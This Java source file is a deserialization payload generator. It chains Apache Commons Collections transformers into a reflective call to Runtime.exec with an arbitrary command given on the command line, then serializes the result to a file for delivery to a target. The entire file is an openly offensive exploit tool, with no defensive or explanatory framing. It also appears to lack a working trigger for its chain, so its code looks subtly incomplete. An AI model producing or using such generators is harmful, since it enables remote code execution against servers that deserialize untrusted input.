import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Map;

public class MapDeserializationPayloadGenerator {
    public static void main(String[] args) throws Exception {
        if (args.length < 2) {
            System.err.println("Usage: MapDeserializationPayloadGenerator <command> <output-file>");
            System.exit(1);
        }

        String command = args[0];
        String outputFile = args[1];

        Transformer[] chain = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer(
                "getMethod",
                new Class[] { String.class, Class[].class },
                new Object[] { "getRuntime", new Class[0] }
            ),
            new InvokerTransformer(
                "invoke",
                new Class[] { Object.class, Object[].class },
                new Object[] { null, new Object[0] }
            ),
            new InvokerTransformer(
                "exec",
                new Class[] { String.class },
                new Object[] { command }
            )
        };

        Map innerMap = new HashMap();
        Map decoratedMap = TransformedMap.decorate(innerMap, null, new ChainedTransformer(chain));

        Map<String, Object> payload = new HashMap<String, Object>();
        payload.put("decoratedMap", decoratedMap);

        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(outputFile))) {
            oos.writeObject(payload);
        }
    }
}
